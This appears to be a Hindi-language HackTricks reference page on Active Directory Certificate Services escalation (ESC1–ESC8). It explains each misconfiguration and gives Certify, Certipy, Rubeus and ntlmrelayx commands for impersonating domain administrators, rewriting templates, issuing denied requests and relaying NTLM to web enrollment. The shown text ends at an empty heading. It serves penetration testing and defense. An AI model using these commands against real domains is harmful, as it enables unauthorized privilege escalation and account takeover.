# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**यह posts के escalation technique sections का सारांश है:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

- **Enterprise CA द्वारा low-privileged users को enrolment rights प्रदान किए जाते हैं।**
- **Manager approval आवश्यक नहीं है।**
- **Authorized personnel के signatures आवश्यक नहीं हैं।**
- **Certificate templates पर security descriptors अत्यधिक permissive हैं, जिससे low-privileged users को enrolment rights प्राप्त करने की अनुमति मिलती है।**
- **Certificate templates ऐसे EKUs define करने के लिए configured हैं जो authentication को सक्षम बनाते हैं:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) जैसे Extended Key Usage (EKU) identifiers, या कोई EKU नहीं (SubCA), शामिल हैं।
- **Requesters को Certificate Signing Request (CSR) में subjectAltName शामिल करने की क्षमता template द्वारा अनुमत है:**
- Active Directory (AD), identity verification के लिए certificate में मौजूद subjectAltName (SAN) को प्राथमिकता देता है। इसका अर्थ है कि CSR में SAN निर्दिष्ट करके, किसी भी user (जैसे, domain administrator) का impersonation करने के लिए certificate request किया जा सकता है। Requester द्वारा SAN निर्दिष्ट किया जा सकता है या नहीं, यह certificate template के AD object में `mspki-certificate-name-flag` property द्वारा दर्शाया जाता है। यह property एक bitmask है, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag की मौजूदगी requester द्वारा SAN निर्दिष्ट करने की अनुमति देती है।

> [!CAUTION]
> बताई गई configuration low-privileged users को अपनी पसंद के किसी भी SAN के साथ certificates request करने की अनुमति देती है, जिससे Kerberos या SChannel के माध्यम से किसी भी domain principal के रूप में authentication संभव हो जाता है।

यह feature कभी-कभी products या deployment services द्वारा HTTPS या host certificates को on-the-fly generate करने के लिए enabled किया जाता है, या फिर समझ की कमी के कारण।

ध्यान दें कि इस option के साथ certificate बनाने पर warning trigger होती है। हालांकि, किसी मौजूदा certificate template (जैसे `WebServer` template, जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled है) को duplicate करके और उसमें authentication OID शामिल करने के लिए modify करने पर ऐसा नहीं होता।

### Abuse

**Vulnerable certificate templates खोजने के लिए** आप चला सकते हैं:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
इस vulnerability का abuse करके **administrator का impersonate करने के लिए** कोई यह चला सकता है:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
फिर आप generated **certificate को `.pfx`** format में transform कर सकते हैं और इसका उपयोग फिर से **Rubeus या certipy का उपयोग करके authenticate** करने के लिए कर सकते हैं:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows binaries "Certreq.exe" और "Certutil.exe" का उपयोग PFX generate करने के लिए किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest के configuration schema के भीतर certificate templates का enumeration, विशेष रूप से वे templates जिनमें approval या signatures आवश्यक नहीं हैं, जिनमें Client Authentication या Smart Card Logon EKU है, और जिनमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled है, निम्नलिखित LDAP query चलाकर किया जा सकता है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

दूसरा abuse scenario पहले वाले का एक variation है:

1. Enrollment rights, Enterprise CA द्वारा low-privileged users को दिए गए हैं।
2. Manager approval की requirement disabled है।
3. Authorized signatures की आवश्यकता omitted है।
4. Certificate template पर overly permissive security descriptor, low-privileged users को certificate enrollment rights प्रदान करता है।
5. **Certificate template को Any Purpose EKU या किसी EKU को शामिल न करने के लिए defined किया गया है।**

**Any Purpose EKU** attacker को **किसी भी purpose** के लिए certificate प्राप्त करने की अनुमति देता है, जिसमें client authentication, server authentication, code signing आदि शामिल हैं। **ESC3 के लिए उपयोग की गई वही technique** इस scenario का exploit करने के लिए employed की जा सकती है।

**No EKUs** वाले certificates, जो subordinate CA certificates के रूप में कार्य करते हैं, **किसी भी purpose** के लिए exploited किए जा सकते हैं और **नए certificates को sign करने के लिए भी उपयोग किए जा सकते हैं**। इसलिए, attacker subordinate CA certificate का उपयोग करके नए certificates में arbitrary EKUs या fields specify कर सकता है।

हालांकि, **domain authentication** के लिए बनाए गए नए certificates कार्य नहीं करेंगे यदि subordinate CA पर **`NTAuthCertificates`** object द्वारा trust नहीं किया गया हो, जो default setting है। फिर भी, attacker **किसी भी EKU** और arbitrary certificate values वाले **नए certificates बना सकता है**। इनका संभावित रूप से कई purposes (जैसे code signing, server authentication आदि) के लिए **abuse** किया जा सकता है और इनके network में SAML, AD FS या IPSec जैसे अन्य applications पर significant implications हो सकते हैं।

AD Forest के configuration schema में इस scenario से match करने वाले templates को enumerate करने के लिए, निम्नलिखित LDAP query चलाई जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

यह scenario पहले और दूसरे scenario जैसा है, लेकिन इसमें **एक अलग EKU** (Certificate Request Agent) और **2 अलग templates** का **abuse** किया जाता है (इसलिए इसमें requirements के 2 sets हैं),

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), जिसे Microsoft documentation में **Enrollment Agent** के रूप में जाना जाता है, किसी principal को **किसी अन्य user की ओर से certificate के लिए enroll** करने की अनुमति देता है।

**“enrollment agent”** ऐसे **template** में enroll करता है और resulting **certificate का उपयोग करके अन्य user की ओर से CSR को co-sign करता है**। इसके बाद यह **co-signed CSR** को CA को भेजता है और ऐसे **template** में enroll करता है जो **“enroll on behalf of”** की अनुमति देता है। CA **“अन्य” user से संबंधित certificate** के साथ respond करता है।

**Requirements 1:**

- Enterprise CA द्वारा low-privileged users को enrollment rights दिए गए हैं।
- Manager approval की requirement omitted है।
- Authorized signatures की कोई requirement नहीं है।
- Certificate template का security descriptor अत्यधिक permissive है और low-privileged users को enrollment rights प्रदान करता है।
- Certificate template में Certificate Request Agent EKU शामिल है, जिससे अन्य principals की ओर से अन्य certificate templates का request किया जा सकता है।

**Requirements 2:**

- Enterprise CA low-privileged users को enrollment rights प्रदान करता है।
- Manager approval को bypass किया जाता है।
- Template का schema version या तो 1 है या 2 से अधिक है, और इसमें एक Application Policy Issuance Requirement निर्दिष्ट है जिसके लिए Certificate Request Agent EKU आवश्यक है।
- Certificate template में defined एक EKU domain authentication की अनुमति देता है।
- CA पर enrollment agents के लिए restrictions लागू नहीं की गई हैं।

### Abuse

इस scenario का abuse करने के लिए आप [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का उपयोग कर सकते हैं:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
वे **users** जिन्हें **enrollment agent certificate** **obtain** करने की अनुमति है, वे templates जिनमें enrollment **agents** को enroll करने की अनुमति है, और वे **accounts** जिनकी ओर से enrollment agent कार्य कर सकता है, enterprise CAs द्वारा सीमित किए जा सकते हैं। इसे `certsrc.msc` **snap-in** खोलकर, **CA पर right-click** करके, **Properties** पर **click** करके और फिर “Enrollment Agents” tab पर **navigate** करके configure किया जाता है।

हालाँकि, यह ध्यान देने योग्य है कि CAs की **default** setting “**Do not restrict enrollment agents**” होती है। जब administrators enrollment agents पर restriction enable करते हैं और इसे “Restrict enrollment agents” पर set करते हैं, तब भी **default configuration** अत्यधिक permissive रहती है। यह **Everyone** को सभी templates में किसी भी व्यक्ति के रूप में enroll करने की अनुमति देती है।

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

**certificate templates** पर मौजूद **security descriptor** उन templates से संबंधित **AD principals** की **permissions** को define करता है।

यदि किसी **attacker** के पास किसी **template** को **alter** करने और **prior sections** में बताई गई कोई भी **exploitable misconfigurations** लागू करने के लिए आवश्यक **permissions** हों, तो privilege escalation संभव हो सकता है।

Certificate templates पर लागू होने वाली उल्लेखनीय permissions में शामिल हैं:

- **Owner:** Object पर implicit control प्रदान करता है, जिससे किसी भी attributes को modify किया जा सकता है।
- **FullControl:** Object पर complete authority प्रदान करता है, जिसमें किसी भी attributes को alter करने की capability शामिल है।
- **WriteOwner:** Object के owner को attacker के control वाले principal में बदलने की अनुमति देता है।
- **WriteDacl:** Access controls को adjust करने की अनुमति देता है, जिससे attacker को FullControl दिया जा सकता है।
- **WriteProperty:** किसी भी object properties को edit करने की अनुमति देता है।

### Abuse

Templates और अन्य PKI objects पर edit rights रखने वाले principals की पहचान करने के लिए Certify से enumerate करें:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
पिछले वाले की तरह privesc का एक उदाहरण:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 तब होता है जब किसी user के पास certificate template पर write privileges हों। इसका दुरुपयोग, उदाहरण के लिए, certificate template के configuration को overwrite करके template को ESC1 के प्रति vulnerable बनाने के लिए किया जा सकता है।

जैसा कि हम ऊपर दिए गए path में देख सकते हैं, केवल `JOHNPC` के पास ये privileges हैं, लेकिन हमारे user `JOHN` के पास `JOHNPC` से जुड़ा नया `AddKeyCredentialLink` edge है। चूंकि यह technique certificates से संबंधित है, इसलिए मैंने इस attack को भी implement किया है, जिसे [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) के नाम से जाना जाता है। यहाँ Certipy के `shadow auto` command की एक छोटी-सी झलक है, जो victim का NT hash retrieve करती है।
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** एक ही command से certificate template की configuration को overwrite कर सकता है। **default** रूप से, Certipy configuration को **ESC1 के प्रति vulnerable** बनाने के लिए **overwrite** करेगा। हम configuration की पुरानी स्थिति को **save** करने के लिए **`-save-old parameter`** भी निर्दिष्ट कर सकते हैं, जो हमारे attack के बाद configuration को **restore** करने में उपयोगी होगा।
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

आपस में जुड़े ACL-based relationships का विस्तृत जाल, जिसमें certificate templates और certificate authority के अलावा कई objects शामिल होते हैं, पूरे AD CS system की security को प्रभावित कर सकता है। ये objects, जो security पर महत्वपूर्ण प्रभाव डाल सकते हैं, इनमें शामिल हैं:

- CA server का AD computer object, जिसे S4U2Self या S4U2Proxy जैसे mechanisms के माध्यम से compromise किया जा सकता है।
- CA server का RPC/DCOM server।
- विशिष्ट container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` के भीतर मौजूद कोई भी descendant AD object या container। इस path में Certificate Templates container, Certification Authorities container, NTAuthCertificates object और Enrollment Services Container जैसे containers और objects शामिल हैं, लेकिन यह सूची इन्हीं तक सीमित नहीं है।

यदि कोई low-privileged attacker इन critical components में से किसी पर control प्राप्त कर लेता है, तो PKI system की security compromise हो सकती है।

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) में चर्चा किया गया विषय **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag के प्रभावों को भी छूता है, जैसा कि Microsoft द्वारा बताया गया है। Certification Authority (CA) पर activate किए जाने पर यह configuration **user-defined values** को **subject alternative name** में **किसी भी request** के लिए शामिल करने की अनुमति देती है, जिसमें Active Directory® से बनाए गए requests भी शामिल हैं। परिणामस्वरूप, यह सुविधा किसी **intruder** को domain **authentication** के लिए configured **किसी भी template** के माध्यम से enroll करने की अनुमति देती है—विशेष रूप से उन templates के माध्यम से, जो **unprivileged** users को enrollment की अनुमति देते हैं, जैसे standard User template। इसके परिणामस्वरूप, ऐसा certificate प्राप्त किया जा सकता है जो intruder को domain administrator या domain के भीतर मौजूद **किसी भी अन्य active entity** के रूप में authenticate करने में सक्षम बनाता है।

**Note**: `certreq.exe` में `-attrib "SAN:"` argument के माध्यम से Certificate Signing Request (CSR) में **alternative names** जोड़ने का तरीका, ESC1 में SANs की exploitation strategy से अलग है। यहां अंतर इस बात में है कि account information को **कैसे encapsulate** किया जाता है—यहां इसे extension के बजाय certificate attribute के भीतर रखा जाता है।

### Abuse

यह सत्यापित करने के लिए कि setting activated है या नहीं, organizations `certutil.exe` के साथ निम्न command का उपयोग कर सकती हैं:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
यह प्रक्रिया मूलतः **remote registry access** का उपयोग करती है, इसलिए, एक वैकल्पिक तरीका हो सकता है:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) जैसे Tools इस misconfiguration को detect और exploit करने में सक्षम हैं:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
इन settings में बदलाव करने के लिए, यह मानते हुए कि आपके पास **domain administrative** अधिकार या equivalent अधिकार हैं, निम्न command किसी भी workstation से execute की जा सकती है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
अपने environment में इस configuration को disable करने के लिए, flag को इस command से हटाया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> मई 2022 के security updates के बाद जारी किए गए नए **certificates** में एक **security extension** शामिल होगा, जिसमें **requester की `objectSid` property** शामिल होती है। ESC1 के लिए, यह SID निर्दिष्ट SAN से प्राप्त होता है। हालांकि, **ESC6** के लिए, SID SAN के बजाय **requester की `objectSid`** को दर्शाता है।\
> ESC6 का exploit करने के लिए, system का ESC10 (Weak Certificate Mappings) के प्रति susceptible होना आवश्यक है, जो **नई security extension** की तुलना में **SAN को प्राथमिकता** देता है।

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Certificate authority का access control permissions के एक set के माध्यम से maintain किया जाता है, जो CA actions को नियंत्रित करता है। इन permissions को `certsrv.msc` खोलकर, किसी CA पर right-click करके, properties चुनकर और फिर Security tab पर जाकर देखा जा सकता है। इसके अतिरिक्त, permissions को PSPKI module का उपयोग करके निम्न commands से enumerate किया जा सकता है:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
यह प्राथमिक rights, अर्थात **`ManageCA`** और **`ManageCertificates`**, के बारे में जानकारी प्रदान करता है, जो क्रमशः “CA administrator” और “Certificate Manager” की भूमिकाओं से संबंधित हैं।

#### दुरुपयोग

किसी certificate authority पर **`ManageCA`** rights होने से principal, PSPKI का उपयोग करके settings को remotely manipulate कर सकता है। इसमें **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag को toggle करना भी शामिल है, जिससे किसी भी template में SAN specification की अनुमति मिलती है—जो domain escalation का एक महत्वपूर्ण पहलू है।

इस process को PSPKI के **Enable-PolicyModuleFlag** cmdlet का उपयोग करके सरल बनाया जा सकता है, जिससे direct GUI interaction के बिना modifications किए जा सकते हैं।

**`ManageCertificates`** rights होने से pending requests को approve करना संभव हो जाता है, जिससे “CA certificate manager approval” safeguard को effectively bypass किया जा सकता है।

Certificate request करने, उसे approve करने और certificate download करने के लिए **Certify** और **PSPKI** modules के combination का उपयोग किया जा सकता है:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

> [!WARNING]
> **पिछले attack** में **`Manage CA`** permissions का उपयोग **EDITF_ATTRIBUTESUBJECTALTNAME2** flag को **enable** करने के लिए किया गया था, ताकि **ESC6 attack** किया जा सके, लेकिन CA service (`CertSvc`) के restart होने तक इसका कोई प्रभाव नहीं होगा। जब किसी user के पास `Manage CA` access right होता है, तो उसे **service restart** करने की अनुमति भी होती है। हालांकि, इसका यह अर्थ नहीं है कि user service को remotely restart कर सकता है। इसके अलावा, अधिकांश patched environments में May 2022 security updates के कारण E**SC6 out of the box काम नहीं कर सकता**।

इसलिए, यहां एक और attack प्रस्तुत किया गया है।

पूर्वापेक्षाएँ:

- केवल **`ManageCA` permission**
- **`Manage Certificates`** permission (`ManageCA` से grant की जा सकती है)
- **`SubCA`** certificate template **enabled** होना चाहिए (`ManageCA` से enabled किया जा सकता है)

यह technique इस तथ्य पर निर्भर करती है कि `Manage CA` _और_ `Manage Certificates` access right वाले users **failed certificate requests issue** कर सकते हैं। **`SubCA`** certificate template **ESC1 के प्रति vulnerable** है, लेकिन केवल **administrators** ही इस template में enroll कर सकते हैं। इसलिए, एक **user**, **`SubCA`** में enroll करने के लिए **request** कर सकता है - जिसे **deny** कर दिया जाएगा - लेकिन बाद में manager द्वारा **issue** कर दिया जाएगा।

#### Abuse

आप अपने user को नए officer के रूप में add करके स्वयं को **`Manage Certificates`** access right **grant** कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** template को **CA** पर `-enable-template` parameter के साथ **enable** किया जा सकता है। Default रूप से, `SubCA` template enabled होता है।
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
यदि हमने इस attack के लिए prerequisites पूरे कर लिए हैं, तो हम **`SubCA` template के आधार पर certificate request कर सकते हैं**।

**यह request deny की जाए**गी**, लेकिन हम private key save करेंगे और request ID note down कर लेंगे।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
हमारे **`Manage CA` और `Manage Certificates`** के साथ, हम `ca` command और `-issue-request <request ID>` parameter का उपयोग करके **विफल certificate** request को issue कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
और अंत में, हम `req` command और `-retrieve <request ID>` parameter का उपयोग करके **जारी किया गया certificate retrieve** कर सकते हैं।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

Classic ESC7 abuses (EDITF attributes को enable करना या pending requests को approve करना) के अलावा, **Certify 2.0** ने एक नया primitive उजागर किया, जिसके लिए Enterprise CA पर केवल *Manage Certificates* (जिसे **Certificate Manager / Officer** role भी कहा जाता है) role आवश्यक है।

`ICertAdmin::SetExtension` RPC method को *Manage Certificates* रखने वाला कोई भी principal execute कर सकता है। हालांकि इस method का उपयोग परंपरागत रूप से legitimate CAs द्वारा **pending** requests पर extensions update करने के लिए किया जाता था, attacker इसका दुरुपयोग करके approval की प्रतीक्षा कर रहे request में एक **non-default** certificate extension (उदाहरण के लिए `1.1.1.1` जैसा custom *Certificate Issuance Policy* OID) **append** कर सकता है।

क्योंकि targeted template उस extension के लिए **default value define नहीं करता**, request जारी होने पर CA attacker-controlled value को overwrite **नहीं** करेगा। इसलिए resulting certificate में attacker द्वारा चुना गया extension मौजूद होगा, जो:

* अन्य vulnerable templates की Application / Issuance Policy requirements को satisfy कर सकता है (जिससे privilege escalation हो सकती है)।
* अतिरिक्त EKUs या policies inject कर सकता है, जो third-party systems में certificate को अप्रत्याशित trust प्रदान करती हैं।

संक्षेप में, *Manage Certificates* — जिसे पहले ESC7 का “कम शक्तिशाली” हिस्सा माना जाता था — अब पूर्ण privilege escalation या long-term persistence के लिए leverage किया जा सकता है, बिना CA configuration को बदले या अधिक restrictive *Manage CA* right की आवश्यकता के।

#### Abusing the primitive with Certify 2.0

1. **ऐसा certificate request submit करें जो *pending* बना रहे।**  इसे manager approval आवश्यक करने वाले template से force किया जा सकता है:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. नई `manage-ca` command का उपयोग करके pending request में एक custom extension **append** करें:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*यदि template पहले से *Certificate Issuance Policies* extension define नहीं करता है, तो ऊपर दिया गया value issuance के बाद preserve रहेगा।*

3. **Request issue करें** (यदि आपके role के पास *Manage Certificates* approval rights भी हैं) या किसी operator द्वारा इसे approve करने की प्रतीक्षा करें। Issue होने के बाद certificate download करें:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Resulting certificate में अब malicious issuance-policy OID मौजूद है और इसका उपयोग subsequent attacks (जैसे ESC13, domain escalation आदि) में किया जा सकता है।

> NOTE:  यही attack `ca` command और `-set-extension` parameter के माध्यम से Certipy ≥ 4.7 के साथ भी execute किया जा सकता है।

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> ऐसे environments में जहां **AD CS installed** है, यदि कोई **web enrollment endpoint vulnerable** मौजूद हो और कम-से-कम एक **certificate template published** हो जो **domain computer enrollment and client authentication** की अनुमति देता हो (जैसे default **`Machine`** template), तो **spooler service active वाले किसी भी computer को attacker compromise कर सकता है**!

AD CS कई **HTTP-based enrollment methods** support करता है, जो administrators द्वारा install किए जा सकने वाले additional server roles के माध्यम से उपलब्ध होते हैं। HTTP-based certificate enrollment के ये interfaces **NTLM relay attacks** के प्रति susceptible हैं। एक **compromised machine** से attacker किसी भी ऐसे AD account का impersonation कर सकता है जो inbound NTLM के माध्यम से authenticate करता है। Victim account का impersonation करते हुए, attacker इन web interfaces को access करके `User` या `Machine` certificate templates का उपयोग करते हुए client authentication certificate request कर सकता है।

- **Web enrollment interface** (`http://<caserver>/certsrv/` पर उपलब्ध पुराना ASP application) default रूप से केवल HTTP पर चलता है, जो NTLM relay attacks से protection प्रदान नहीं करता। इसके अतिरिक्त, यह अपने Authorization HTTP header के माध्यम से केवल NTLM authentication को explicitly permit करता है, जिससे Kerberos जैसे अधिक secure authentication methods लागू नहीं हो पाते।
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service और **Network Device Enrollment Service** (NDES) default रूप से अपने Authorization HTTP header के माध्यम से negotiate authentication support करते हैं। Negotiate authentication Kerberos और **NTLM** दोनों को support करता है, जिससे attacker relay attacks के दौरान authentication को **NTLM** पर downgrade कर सकता है। हालांकि ये web services default रूप से HTTPS enable करती हैं, केवल HTTPS NTLM relay attacks से सुरक्षा **नहीं** देता। HTTPS services को NTLM relay attacks से protection तभी मिलती है जब HTTPS को channel binding के साथ combine किया जाए। दुर्भाग्य से, AD CS IIS पर Extended Protection for Authentication activate नहीं करता, जो channel binding के लिए आवश्यक है।

NTLM relay attacks की एक सामान्य **समस्या** NTLM sessions की **कम अवधि** और उन services के साथ interact करने में attacker की असमर्थता है जो NTLM signing **आवश्यक** करती हैं।

फिर भी, यह limitation user के लिए certificate प्राप्त करने के लिए NTLM relay attack exploit करके दूर की जा सकती है, क्योंकि session की अवधि certificate की validity period द्वारा निर्धारित होती है और certificate का उपयोग उन services के साथ किया जा सकता है जो NTLM signing **अनिवार्य** करती हैं। Stolen certificate का उपयोग करने के instructions के लिए देखें:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attacks की एक और limitation यह है कि **attacker-controlled machine को victim account द्वारा authenticate किया जाना आवश्यक है**। Attacker या तो प्रतीक्षा कर सकता है या इस authentication को **force** करने का प्रयास कर सकता है:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify) का `cas` **enabled HTTP AD CS endpoints** enumerate करता है:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` property का उपयोग enterprise Certificate Authorities (CAs) द्वारा Certificate Enrollment Service (CES) endpoints को store करने के लिए किया जाता है। इन endpoints को **Certutil.exe** tool का उपयोग करके parse और list किया जा सकता है:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify के साथ Abuse
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) के साथ दुरुपयोग

